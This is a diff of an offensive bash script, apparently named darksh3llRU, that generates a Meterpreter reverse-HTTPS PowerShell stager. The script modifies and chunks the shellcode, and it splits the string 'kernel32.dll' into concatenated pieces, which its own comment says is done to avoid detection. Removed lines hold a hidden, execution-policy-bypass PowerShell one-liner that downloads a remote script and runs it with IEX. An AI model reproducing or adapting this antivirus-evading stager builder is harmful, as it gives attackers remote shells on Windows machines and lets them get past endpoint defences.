@@ -1,14 +1,16 @@
 #!/bin/bash
 # shellcode replacement stuff
 # meterpreter PSH-NET payload
-# darksh3llRU v0.9
+# darksh3llRU v1.0
 
 # payload options for staged msfvenom -p windows/x64/meterpreter/reverse_https --list-options
 payload="windows/x64/meterpreter/reverse_https"
+#payload="windows/x64/meterpreter/reverse_winhttps"
 ListenerIP=10.0.8.4
-ListenerPort=8443
+ListenerPort=443
 ListenerURI="/logout"
 ProxyType=HTTP
+#HttpProxyIE=true
 ProxyHost=""
 ProxyPort=""
 ProxyUser=""
@@ -38,7 +40,6 @@ base64 -d raw_pshnet_revhttps.base64.txt | xxd -p | tr -d '\n'  > raw_pshnet_rev
 printf "Original shellcode raw_pshnet_revhttps.hex.txt, modify and put into the file final_pshnet_revhttps.hex.txt\n"
 
 # shellcode modification section
-printf "There should be some input waiting stuff to proceed with converting, encoding...\n"
 # n00b shellcode copy paste -> emulation for shellcode modification !!!SWITCH OFF FOR REAL!!!
 cp raw_pshnet_revhttps.hex.txt final_pshnet_revhttps.hex.txt
 read -p "Press any key to continue when modified shellcode file is ready..." -n1 -s
@@ -51,11 +52,6 @@ raw_shellcode=$(<raw_pshnet_revhttps.base64.txt)
 eleet_shellcode=$(<final_pshnet_revhttps.base64.txt)
 printf "Old shellcode:\n$raw_shellcode"
 printf "\nNew shellcode:\n$eleet_shellcode"
-# make a backup of the original file and perform sed on the new file
-#cp raw_pshnet_revhttps.ps1 eleet_pshnet_revhttps.ps1
-#sed -i "s,$raw_shellcode,$eleet_shellcode,g" eleet_pshnet_revhttps.ps1
-#printf "\nShellcode replacement done! eleet psh-net usage example:\n"
-#printf "powershell.exe -Window Hidden -Nop -Exec Bypass -C \"[System.Net.WebRequest]::DefaultWebProxy=[System.Net.WebRequest]::GetSystemWebProxy();[System.Net.WebRequest]::DefaultWebProxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;IWR('$DownloadURL/eleet_pshnet_revhttps.ps1') -UserAgent $UserAgent|IEX\"\n"
 
 # real eleet stager creations
 chunk_size=77
@@ -73,9 +69,9 @@ do
     shellcode_chunks[$i]=$(echo ${eleet_shellcode:$y:$chunk_size})
     y=$(($y+$chunk_size))
 done
-printf "DEBUG: shellcode_chunks array is printed:\n"
+printf "DEBUG: shellcode_chunks array are printed:\n"
 printf "${shellcode_chunks[*]}\n"
-printf "DEBUG: shellcode_chunks array is correct?\n"
+printf "DEBUG: shellcode_chunks array are correct?\n"
 
 # insert shellcode_chunks before call to encoded shellcode
 for (( x=0; x <=$shellcode_parts; x++))
@@ -118,7 +114,6 @@ do
 done
 
 # do kernel32.dll things to avoid detection
-#ISB.Downloader!gen245
 sed -i 's,kernel32.dll,ke"+"rn"+"e"+"l"+"32."+"d"+"l"+"l,g' final_pshnet_revhttps.ps1
 
 printf "Final psh-net usage example:\n"
